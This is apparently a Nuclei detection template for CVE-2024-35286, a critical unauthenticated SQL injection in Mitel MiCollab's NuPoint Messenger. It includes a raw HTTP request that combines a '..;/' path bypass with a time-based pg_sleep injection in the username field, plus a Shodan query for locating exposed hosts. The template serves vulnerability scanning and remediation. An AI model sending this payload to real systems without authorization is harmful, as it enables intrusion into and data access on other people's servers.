http:
- matchers:
  - condition: and
    dsl:
    - duration >= 6
    - status_code == 500
    - contains_any(body, "com.mitel.npm.web.console", "java.lang.NullPointerException")
    - contains(set_cookie, "JSESSIONID=")
    type: dsl
  raw:
  - '@timeout: 20s

    POST /npm-pwg/..;/npm-admin/login.do HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    subAction=basicLogin&username=test''||pg_sleep(6)--&password=test&clusterIndex=0

    '
id: CVE-2024-35286
info:
  author: daffainfo
  classification:
    cpe: cpe:2.3:a:mitel:micollab:*:*:*:*:*:*:*:*
    cve-id: CVE-2024-35286
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-89
    epss-percentile: 0.98056
    epss-score: 0.57551
  description: 'A vulnerability in NuPoint Messenger (NPM) of Mitel MiCollab through
    9.8.0.33 allows an unauthenticated attacker to conduct a SQL injection attack
    due to insufficient sanitization of user input. A successful exploit could allow
    an attacker to access sensitive information and execute arbitrary database and
    management operations.

    '
  impact: 'Unauthenticated attackers can execute arbitrary SQL queries to access sensitive
    information and execute arbitrary database and management operations.

    '
  metadata:
    max-request: 1
    product: micollab
    shodan-query: html:"Mitel" html:"MiCollab"
    vendor: mitel
    verified: true
  name: Mitel MiCollab <= 9.8.0.33 - SQL Injection
  reference:
  - https://www.mitel.com/support/security-advisories/mitel-product-security-advisory-24-0014
  - https://labs.watchtowr.com/where-theres-smoke-theres-fire-mitel-micollab-cve-2024-35286-cve-2024-41713-and-an-0day/
  remediation: 'Update Mitel MiCollab to a version later than 9.8.0.33.

    '
  severity: critical
  tags: cve,cve2024,mitel,micollab,sqli,vkev,vuln
